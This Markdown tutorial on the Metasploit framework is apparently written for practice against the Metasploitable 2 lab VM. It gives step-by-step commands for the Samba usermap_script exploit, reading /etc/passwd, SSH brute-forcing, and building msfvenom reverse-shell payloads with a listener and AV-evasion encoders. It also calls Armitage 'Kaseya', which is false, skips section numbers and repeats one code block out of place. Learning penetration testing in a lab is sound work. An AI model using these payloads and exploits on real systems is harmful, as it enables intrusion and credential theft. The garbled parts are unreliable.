## 1. Introduction

Metasploit is the world's most widely used penetration testing framework. It provides a modular, structured environment for discovering, exploiting, and validating security vulnerabilities across systems, networks, and applications.

**Primary use cases:**

- Penetration testing and vulnerability assessment
- Security auditing of applications and network services
- Bug bounty hunting and research
- Post-exploitation and lateral movement testing
- Payload generation for authorized red team exercises

> **Lab Recommendation:** Always practice on an isolated, intentionally vulnerable environment such as Metasploitable 2. Never run exploits against live systems without written authorization.

## 2. Initial Setup & Configuration

### 2.1 First-Time Setup (Run Once Only)

You only need these steps the very first time you use Metasploit on a new installation.

**Step 1 — Switch to root:**

```bash
sudo su
```

> You will be prompted for your password.

**Step 2 — Initialize the Metasploit database:**

```bash
msfdb init
```

> If you see `Database already started`, the database was previously initialized. This is normal.

---

### 2.2 Starting Metasploit (Every Session)

Run these steps every time you open a new terminal and want to use Metasploit.

```bash
# 1. Switch to root
sudo su

# 2. Start the PostgreSQL database service
service postgresql start

# 3. Verify the service is active
service postgresql status

# 4. Launch the Metasploit console
msfconsole
```

Metasploit displays a random banner on startup (it changes each launch — this is normal) and loads its modules. You are now at the `msf6 >` prompt.

## 3. Modules Overview

Metasploit organizes its capabilities into **seven modules**. Understanding which to use for a given task is fundamental to effective penetration testing.

| Module      | Count   | Purpose |
|-------------|---------|---------|
| **Exploits**   | 2,461+  | Code targeting specific vulnerabilities to achieve unauthorized access or code execution |
| **Auxiliary**  | 1,267+  | Scanning, fuzzing, enumeration, brute-forcing, sniffing, spoofing — no direct exploitation |
| **Payloads**   | 1,471+  | Code delivered after exploitation to establish shells or execute remote commands |
| **Encoders**   | ~45     | Obfuscate payloads to bypass antivirus or IDS/IPS |
| **NOPs**       | ~11     | Padding instructions that maintain payload size and prevent crashes |
| **Evasion**    | ~60     | Advanced AV bypass techniques — more sophisticated than Encoders |
| **Post**       | 431+    | Post-exploitation: privilege escalation, persistence, pivoting, credential harvesting |

---

### 3.1 Exploit Rankings

When searching for exploits, always prioritize by rank:

| Rank        | Meaning |
|-------------|---------|
| `excellent` | Most reliable — choose these first |
| `great`     | Reliable with minor conditions |
| `good`      | Works under specific conditions |
| `normal`    | May need manual configuration |
| `low`       | Rarely successful automatically |

---

### 3.2 Payload Types

| Type       | Description |
|------------|-------------|
| **Singles**  | Self-contained; perform a single task (e.g., add a user) |
| **Stagers**  | Small payload that connects back, then downloads the stage |
| **Stages**   | Full payload downloaded by stagers (e.g., Meterpreter, VNC) |

Most commonly used Windows payload: `windows/meterpreter/reverse_tcp`

## 5. Setting Up Your Practice Lab (Metasploitable 2)

Metasploitable 2 is an intentionally vulnerable Linux VM designed for practicing Metasploit. It contains dozens of known vulnerabilities. Always use this as your target — never real systems.

### 5.1 Prerequisites

- VMware Workstation Player (free) or VMware Workstation Pro — download from [vmware.com](https://www.vmware.com)
- Alternatively, VirtualBox from [virtualbox.org](https://www.virtualbox.org)
- Kali Linux VM (your attacker machine)
- Metasploitable 2 image file

---

### 5.2 Downloading Metasploitable 2

1. Search for: `metasploitable 2 download`
2. Navigate to the SourceForge link: [sourceforge.net/projects/metasploitable](https://sourceforge.net/projects/metasploitable)
3. Click **Download** and wait for the 5-second countdown
4. The `.zip` file will download automatically

---

### 5.3 Importing into VMware

1. Extract the `.zip` file — you will see a `Metasploitable.vmx` file inside
2. Double-click the `.vmx` file — VMware automatically imports the VM
3. When prompted with *"Did you move or copy this VM?"*, select **I Copied It**
4. The VM will boot and display login credentials on screen

```
Username: msfadmin
Password: msfadmin
```

5. Log in and run `ifconfig` to note the VM's IP address

---

### 5.4 Network Adapter Configuration (Critical)

You **must** set Metasploitable 2's network adapter to **Bridged** mode so your Kali machine can reach it.

1. Power off Metasploitable 2
2. In VMware, select the VM and click **Edit Virtual Machine Settings**
3. Select **Network Adapter**
4. Change from **NAT** to **Bridged**
5. Click **OK** and power the VM back on

> **Why Bridged?** Bridged mode places the VM on the same LAN as your host machine, giving it a reachable IP. Without it, Kali cannot scan or exploit the target directly.

## 6. Exploit Module Walkthrough — Samba Attack

A complete step-by-step exploitation of the classic Samba `usermap_script` vulnerability on Metasploitable 2.

> **Target:** Metasploitable 2 — Samba service
> **Vulnerability:** CVE-2007-2447 (Samba < 3.0.20 username map script command injection)

---

### Step 1 — Start Metasploit

```bash
sudo su
service postgresql start
msfconsole
```

### Step 2 — Search for the Exploit

```bash
search type:exploit platform:unix samba
```

Look for the module ranked `excellent` named `exploit/multi/samba/usermap_script`.

### Step 3 — Load the Exploit

```bash
use exploit/multi/samba/usermap_script
```

Your prompt changes to: `msf6 exploit(multi/samba/usermap_script) >`

### Step 4 — Review Options

```bash
show options
```

Key required options:

| Option | Description |
|--------|-------------|
| `RHOSTS` | Remote target IP — **required, currently blank** |
| `LHOST` | Your attacker IP — usually auto-detected |
| `LPORT` | Listening port for the reverse connection (default: 4444) |

### Step 5 — Set the Target

```bash
set RHOSTS 192.168.1.60
```

> Replace `192.168.1.60` with your Metasploitable 2 IP from `ifconfig`.

### Step 6 — Launch the Exploit

```bash
exploit
```

Expected output:
```
[*] Started reverse TCP handler on 192.168.1.x:4444
[*] Command shell session 1 opened
```

### Step 7 — Verify the Shell

```bash
ifconfig
```

The IP returned should match Metasploitable 2's IP — confirming you are executing commands on the target.

```bash
whoami
ls
cat /etc/passwd
```

> **Next step:** Upgrade to Meterpreter for advanced features: `sessions -u 1`

## 7. Session Management

A session is an active connection to a compromised machine. Metasploit supports multiple simultaneous sessions.

### Background a Session

```bash
# Press Ctrl+Z, then confirm with Y
Ctrl + Z
```

### List Sessions

```bash
sessions -l
```

Output includes: ID, Type (shell/meterpreter), connection info, and target host.

### Interact with a Session

```bash
sessions -i 1
# Replace 1 with the session ID
```

### Upgrade Shell to Meterpreter

```bash
sessions -u 1
```

Upgrading gives access to advanced post-exploitation features like file browsing, screenshot capture, keylogging, and privilege escalation.

### Kill Sessions

```bash
sessions -k 1    # Kill session 1
sessions -K      # Kill ALL sessions
```

## 8. Auxiliary Module

Auxiliary modules are the intelligence-gathering tools of Metasploit. They cover scanning, fuzzing, and brute-forcing without directly exploiting vulnerabilities.

### 8.1 Directory Fuzzing

```bash
use auxiliary/scanner/http/dir_scanner
set RHOSTS 192.168.1.60
set RPORT 80
run
```

### 8.2 Port Scanning

```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.60
set PORTS 1-1024
run
```

Or use the built-in Nmap wrapper (results auto-saved to the database):

```bash
db_nmap -sV -O 192.168.1.60
```

### 8.3 SSH Brute-Force Attack

**Step 1 — Load the SSH login scanner:**

```bash
search ssh
use auxiliary/scanner/ssh/ssh_login
show options
```

**Step 2 — Configure the attack:**

```bash
set RHOSTS 192.168.1.60
set THREADS 5
set USER_FILE /path/to/usernames.txt
set PASS_FILE /path/to/passwords.txt
set STOP_ON_SUCCESS true
set VERBOSE true
```

| Option | Description |
|--------|-------------|
| `STOP_ON_SUCCESS true` | Stops immediately after the first successful login |
| `VERBOSE true` | Shows each attempt in real-time |
| `THREADS` | Number of parallel threads (higher = faster, but noisier) |

**Step 3 — Run:**

```bash
run
```

When credentials are found: `[+] Success: username:password`

**Step 4 — Connect via SSH:**

```bash
ssh msfadmin@192.168.1.60

# If you get an algorithm negotiation error:
ssh -o HostKeyAlgorithms=+ssh-rsa msfadmin@192.168.1.60
```

> The `-o HostKeyAlgorithms=+ssh-rsa` flag is needed when the target uses an older SSH key algorithm that modern clients disable by default.

## 9. Payload Generation with MSFVenom

MSFVenom is Metasploit's standalone payload generator. It creates executables that, when run on a target, establish a reverse connection back to your machine.

> ⚠️ **Legal Warning:** Generating and deploying payloads against systems you do not own or have explicit written permission to test is illegal. Use only in authorized lab environments.

### 9.1 View Help

```bash
msfvenom -h
```

### 9.2 Flag Reference

| Flag | Description |
|------|-------------|
| `-p` | Payload to use — format: `OS/payload/connection_type` |
| `LHOST` | Your attacker machine IP (receives the connection) |
| `LPORT` | Port on your machine listening for the connection |
| `-f` | Output format: `exe`, `elf`, `apk`, `raw`, etc. |
| `-o` | Output file path and name |
| `-e` | Encoder for AV evasion (e.g., `x86/shikata_ga_nai`) |
| `-i` | Number of encoding iterations (higher = harder to detect) |

### 9.3 Generating Payloads

**Windows `.exe`:**

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
         LHOST=<your_attacker_ip> \
         LPORT=4444 \
         -f exe \
         -o payload.exe
```

**Linux ELF:**

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp \
         LHOST=<your_attacker_ip> \
         LPORT=4444 \
         -f elf \
         -o payload.elf
```

**Android APK:**

```bash
msfvenom -p android/meterpreter/reverse_tcp \
         LHOST=<your_attacker_ip> \
         LPORT=4444 \
         -o payload.apk
```

### 9.4 List Available Payloads

```bash
msfvenom -l payloads | grep windows
msfvenom -l payloads | grep android
msfvenom -l payloads | grep linux
```

### 9.5 Setting Up the Listener

After delivering the payload and having the target run it, catch the connection:

```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <your_ip>
set LPORT 4444
exploit -j
```

When the victim runs the payload, a Meterpreter session opens automatically.

## 10. Graphical Interface — Kaseya (Armitage)

Kaseya (Armitage) is a graphical frontend for Metasploit. It presents the same capabilities through a visual interface, making it easier to visualize targets and manage multiple sessions.

### 10.1 Installing Kaseya

```bash
# 1. Download the Linux binary from GitHub releases
wget <download_link> -O kaseya

# 2. Make it executable
chmod +x kaseya

# 3. Run it in the background
./kaseya &
```

### 10.2 Connecting to Metasploit

Kaseya connects via the MSFRPC plugin. Load the plugin first from msfconsole:

```bash
# Stop any conflicting service (e.g., Apache)
service apache2 stop

# Start PostgreSQL
service postgresql start

# Launch msfconsole
msfconsole

# Load the RPC plugin
load msf_rpc
```

You will see: `Successfully loaded plugin: msf_rpc` along with a generated password.

**In the Kaseya login screen:**

| Field | Value |
|-------|-------|
| Username | `msf` |
| Password | *(paste the generated password from msfconsole)* |
| SSL | Uncheck |

Click **Connect**. The GUI loads with all Metasploit modules and sessions visible visually.


```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <your_ip>
set LPORT 4444
exploit -j
```

## 12. Glossary

| Term | Definition |
|------|------------|
| **RHOSTS** | Remote Host(s) — the IP address(es) of the target machine(s) |
| **LHOST** | Local Host — your attacker machine's IP address |
| **LPORT** | Local Port — the port on your machine listening for connections |
| **RPORT** | Remote Port — the port on the target running the vulnerable service |
| **Meterpreter** | Advanced Metasploit payload providing an interactive shell with rich post-ex features |
| **Reverse Shell** | Connection initiated by the target back to the attacker (bypasses firewalls) |
| **Bind Shell** | Connection initiated by the attacker to a listener on the target |
| **Post-Exploitation** | Actions after gaining access: persistence, lateral movement, credential harvesting |
| **Brute Force** | Systematically trying all combinations from wordlists to crack credentials |
| **Fuzzing** | Sending unexpected or malformed data to find parsing bugs or hidden endpoints |
| **CVE** | Common Vulnerabilities and Exposures — standard ID for known security flaws |
| **Pivot** | Using a compromised host as a relay to attack internal systems behind it |
| **Session** | An active connection to a compromised machine, managed by Metasploit |
| **Wordlist** | A text file containing candidate passwords or usernames |
| **AV Evasion** | Encoding/obfuscation techniques to prevent antivirus from detecting payloads |
| **Stager** | A small payload that establishes the initial connection and downloads the full stage |
| **Stage** | The full payload (e.g., Meterpreter) downloaded and executed by the stager |
